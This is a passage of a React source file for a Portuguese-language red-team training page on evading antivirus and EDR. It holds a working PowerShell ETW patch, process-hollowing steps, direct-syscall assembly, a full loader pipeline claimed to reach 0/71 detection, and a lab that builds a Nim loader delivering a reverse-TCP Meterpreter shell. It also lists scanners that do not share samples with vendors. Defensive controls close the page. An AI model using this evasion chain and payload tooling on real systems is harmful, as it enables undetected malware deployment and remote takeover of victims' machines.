        code={`$Kernel32 = @"
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
"@
Add-Type -MemberDefinition $Kernel32 -Name "K32" -Namespace "Win32"

$ntdll = [Win32.K32]::LoadLibrary("ntdll.dll")
$etw   = [Win32.K32]::GetProcAddress($ntdll, "EtwEventWrite")

# x64: 'ret' (0xC3) -- retorna sucesso sem fazer nada
$patch = [Byte[]] (0xC3)
$old = 0
[Win32.K32]::VirtualProtect($etw, [UIntPtr]1, 0x40, [ref]$old) | Out-Null
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $etw, 1)
Write-Host "[+] EtwEventWrite patched at $etw"`}
      />

      <h2>Process Hollowing</h2>
      <p>
        Cria processo legítimo (<code>svchost.exe</code>, <code>notepad.exe</code>) suspenso,
        unmappa o código original, escreve seu shellcode no espaço, ajusta entry point e resume.
        Resultado: <code>tasklist</code> mostra <code>svchost.exe</code> rodando seu Meterpreter.
      </p>

      <OutputBlock label="passos do hollowing — ordem das chamadas Win32" type="info">
{`1. CreateProcessA("C:\\\\Windows\\\\System32\\\\svchost.exe", ..., CREATE_SUSPENDED)
2. NtUnmapViewOfSection(hProcess, imageBaseAddress)        ← remove código original
3. VirtualAllocEx(hProcess, base, payloadSize, MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE)
4. WriteProcessMemory(hProcess, base, payloadBuf, payloadSize, &n)
5. GetThreadContext(hThread, &ctx)
6. ctx.Rcx = entryPoint   ← redireciona EIP/RIP
7. SetThreadContext(hThread, &ctx)
8. ResumeThread(hThread)                                    ← bum, executa`}
      </OutputBlock>

      <Terminal
        path="~/hollow"
        lines={[
          {
            cmd: "git clone https://github.com/m0n0ph1/Process-Hollowing && cd Process-Hollowing",
            out: `Cloning into 'Process-Hollowing'...
remote: Counting objects: 142, done.`,
            outType: "muted",
          },
          {
            cmd: "x86_64-w64-mingw32-gcc hollow.c -o hollow.exe -lntdll",
            out: `(silencioso. ~50KB binary)`,
            outType: "default",
          },
          {
            comment: "uso: hollow.exe <PE_LEGÍTIMO> <SHELLCODE>",
            cmd: "wine hollow.exe C:\\\\Windows\\\\System32\\\\notepad.exe payload.bin",
            out: `[*] Creating suspended notepad.exe
[+] PID: 4421
[*] Reading PEB at 0x7FF6A1B40000
[*] Image base: 0x00007FF6A1B40000 (size: 0x4A000)
[*] Unmapping section...
[+] Unmap OK
[*] Allocating 0x10A000 RWX at original base...
[+] Alloc OK
[*] Writing payload (1142528 bytes)...
[+] Write OK
[*] Patching entry point in PEB...
[+] Patched
[*] Resuming thread...
[+] Hollowed! notepad.exe (PID 4421) now runs your code.`,
            outType: "warning",
          },
        ]}
      />

      <h2>Direct Syscalls — bypassar hooks de userland do EDR</h2>
      <p>
        EDRs colocam hooks (JMP) no início de funções de <code>ntdll.dll</code>:
        <code>NtAllocateVirtualMemory</code>, <code>NtCreateThreadEx</code>,
        <code>NtWriteVirtualMemory</code>, etc. Chamar direto via <code>syscall</code> assembly
        pula o hook → EDR não vê.
      </p>

      <CodeBlock
        title="syscall.asm — chamar NtAllocateVirtualMemory direto (NASM)"
        language="asm"
        code={`; build:  nasm -f win64 syscall.asm -o syscall.obj
; SSN (System Service Number) muda por build do Windows
; Use SysWhispers3 para gerar dinamicamente

global NtAllocateVirtualMemory_direct

NtAllocateVirtualMemory_direct:
    mov  r10, rcx          ; convenção syscall x64: arg1 vai em r10 (não rcx)
    mov  eax, 0x18         ; SSN do NtAllocateVirtualMemory (Win10 22H2)
    syscall                ; entra no kernel SEM passar pela ntdll patcheada
    ret`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "SysWhispers3 — gera headers/asm com SSNs do Windows alvo",
            cmd: "git clone https://github.com/klezVirus/SysWhispers3 && cd SysWhispers3 && python3 syswhispers.py -a x64 -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx,NtProtectVirtualMemory -o syswhispers",
            out: `Cloning into 'SysWhispers3'...

  SysWhispers3 v0.2.0
  by @klezVirus  (fork of @FalconForceTeam / @Jackson_T)

[+] Loaded function map: win-10-22h2.json
[+] Generated:
    syswhispers.h
    syswhispers.c
    syswhispers-asm.x64.asm

  Functions: 4 (egg-hunter mode: enabled)
  SSNs: dynamic (resolved at runtime)`,
            outType: "info",
          },
          {
            cmd: "x86_64-w64-mingw32-gcc -c syswhispers.c -o sw.o && nasm -f win64 syswhispers-asm.x64.asm -o sw_asm.o && x86_64-w64-mingw32-gcc loader.c sw.o sw_asm.o -o loader_directsys.exe",
            out: `(silencioso. ~70KB binary que faz IO sem tocar ntdll!)`,
            outType: "warning",
          },
        ]}
      />

      <h2>Pipeline completo recomendado</h2>
      <OutputBlock label="receita 'realista' que funciona em CrowdStrike + Defender (out 2026)" type="warning">
{`shellcode = msfvenom raw (windows/x64/meterpreter/reverse_https)
                ↓
       donut --input shellcode --bypass 1 --compress xpress
                ↓                              ← shellcode comprimido + AMSI/WDLP bypass
       sgn -c 50 -E (shikata_ga_nai polimórfico em Go)
                ↓                              ← entropia ~uniforme, hash diferente cada build
       AES-256 encrypt com chave derivada de domínio (sleep mask)
                ↓
       Rust loader (release, opt-level=z, strip, lto):
           - direct syscalls (SysWhispers3 SSNs dinâmicos)
           - ETW patch (EtwEventWrite → ret)
           - sandbox checks (CPU count >=4, RAM >=4GB, uptime >10min, mouse moved)
           - sleep 90s antes do unhooking
           - Process Hollowing em svchost.exe
                ↓
       Pack com Themida (ULTRA + VM Macros) ou Confuser (se .NET)
                ↓
       Sign com cert SSL real (compre EV cert ~ $500/ano)
                ↓
       loader.exe assinado, ~3.2MB, AV/EDR detection: 0 / 71 ✨`}
      </OutputBlock>

      <h2>Validação — onde testar SEM expor o sample</h2>
      <CommandTable
        title="Sandboxes / scanners (e o que NÃO usar)"
        variations={[
          { cmd: "VirusTotal", desc: "❌ NÃO USAR para payloads reais.", output: "VT compartilha amostra com vendors → seu binário vira assinatura em horas." },
          { cmd: "AntiScan.me", desc: "✅ Não compartilha (paid tier).", output: "$10-30/mês. ~30 vendors." },
          { cmd: "Kleenscan.com", desc: "✅ Free tier diário, sem distrib.", output: "~25 vendors. Boa primeira passada." },
          { cmd: "AVCheck.net", desc: "✅ Pago, sem distribuição.", output: "Padrão na indústria red team." },
          { cmd: "Lab local", desc: "✅ VM Win10/Win11 + Defender atualizado offline.", output: "Único 100% confiável. Snapshot antes de cada teste." },
          { cmd: "Tria.ge (Hatching)", desc: "Sandbox dinâmica, premium não compartilha.", output: "Vê comportamento, não só estática." },
        ]}
      />

      <h2>Defesa — o que recomendar no relatório</h2>
      <CommandTable
        title="Controles efetivos contra esta cadeia"
        variations={[
          { cmd: "ASR rules (Defender)", desc: "Block executable from email/USB.", output: "Bloqueia .hta, .iso, macro, child process do Office." },
          { cmd: "AppLocker / WDAC", desc: "Allowlist de assinatura/path.", output: "Mata loaders não-assinados ou em %TEMP%." },
          { cmd: "Constrained Language Mode (PS)", desc: "PowerShell sem .NET reflection.", output: "Mata 95% dos AMSI bypass." },
          { cmd: "Kernel ETW providers + Sysmon 15+", desc: "Telemetria de syscall, image load, mem alloc.", output: "EDR vê unhooking, hollow, etc." },
          { cmd: "EDR com kernel callbacks", desc: "PsSetCreateProcessNotifyRoutineEx etc.", output: "Direct syscall não escapa kernel callback." },
          { cmd: "Code signing enforcement", desc: "Bloqueia binário não-assinado.", output: "Loader tem que ter EV cert válido (caro)." },
          { cmd: "Memory scanner periódico (PE Sieve)", desc: "Encontra hollowed/unbacked code.", output: "Detecta hollowing post-fato." },
          { cmd: "Hardware-enforced stack protection (Intel CET)", desc: "ROP harder.", output: "Indirect calls validadas pelo CPU." },
        ]}
      />

      <PracticeBox
        title="Lab: gere e teste um loader Nim contra Defender (offline)"
        goal="Construir loader Nim simples, gerar shellcode com donut+sgn, testar em Win10 VM SEM internet (Defender atualizado offline)."
        steps={[
          "Snap VM Windows 10 limpa, com Defender ATIVO + signatures atualizadas. Desconecte da rede.",
          "No Kali: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f raw -o sc.bin",
          "donut -i sc.bin -o sc_donut.bin -a 2 -f 1",
          "sgn -a 64 -i sc_donut.bin -o sc_final.bin -c 50 -E",
          "base64 -w0 sc_final.bin → embute em loader.nim (XOR 0x42 antes).",
          "nim c -d:release --opt:size --app:gui --cc:gcc --gcc.exe:x86_64-w64-mingw32-gcc --os:windows -o:upd.exe loader.nim",
          "Suba handler: msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.56.1; set LPORT 4444; run'",
          "Compartilhe upd.exe via SMB para a VM, execute, observe sessão Meterpreter.",
        ]}
        command={`# pipeline completo
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f raw -o sc.bin
~/donut/donut -i sc.bin -o sc_d.bin -a 2 -f 1 -b 1
sgn -a 64 -i sc_d.bin -o sc_f.bin -c 50 -E

# encode + injeta no loader.nim (substitui a const SC_B64)
B64=$(base64 -w0 sc_f.bin)
sed -i "s|ENCODED_BASE64_DO_SHELLCODE_AQUI...|$B64|" loader.nim

nim c -d:release -d:strip --opt:size --app:gui \\
  --cc:gcc --gcc.exe:x86_64-w64-mingw32-gcc \\
  --gcc.linkerexe:x86_64-w64-mingw32-gcc \\
  --os:windows -o:upd.exe loader.nim

ls -la upd.exe   # ~200KB, GUI subsystem
file upd.exe`}
        expected={`-rwxr-xr-x 1 wallyson wallyson 218112 Apr  4 02:42 upd.exe
upd.exe: PE32+ executable (GUI) x86-64, for MS Windows

(no msfconsole após executar upd.exe na VM:)
[*] Started reverse TCP handler on 192.168.56.1:4444
[*] Sending stage (200774 bytes) to 192.168.56.108
[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.108:51842)

meterpreter > getuid
Server username: DESKTOP-ANA\\ana.silva`}
        verify="Defender NÃO deveria detectar o upd.exe nem em scan estático nem em runtime. Se detectar, aumente entropia (mais iterations sgn), mude key XOR, varie pattern de alocação (NtAllocateVirtualMemory direto via syswhispers)."
      />

      <AlertBox type="warning" title="Realidade: 'FUD' (Fully Undetectable) tem prazo de validade">
        Um loader que está 0/71 hoje vira 40/71 em 2 semanas se você submeter no VirusTotal.
        Red teamers profissionais mantêm <strong>builders privados</strong>, regeneram a cada
        engagement, e <em>nunca</em> compartilham binários publicamente. Detection-as-a-Service
        é guerra de gato e rato — você está sempre uma versão de signature atrás.
      </AlertBox>

      <AlertBox type="info" title="Defesa &gt; Ofensa">
        Esta página tem 10× mais valor para um defensor (saber o que procurar) do que para um
        atacante (que já tem builders comerciais melhores). Se você é blue team: configure
        Sysmon EID 8 (CreateRemoteThread), EID 10 (ProcessAccess para LSASS), EID 25 (ProcessTampering),
        e ASR rules. Habilite PowerShell Script Block Logging (EID 4104) e Module Logging (EID 4103).
      </AlertBox>
    </PageContainer>
  );
}
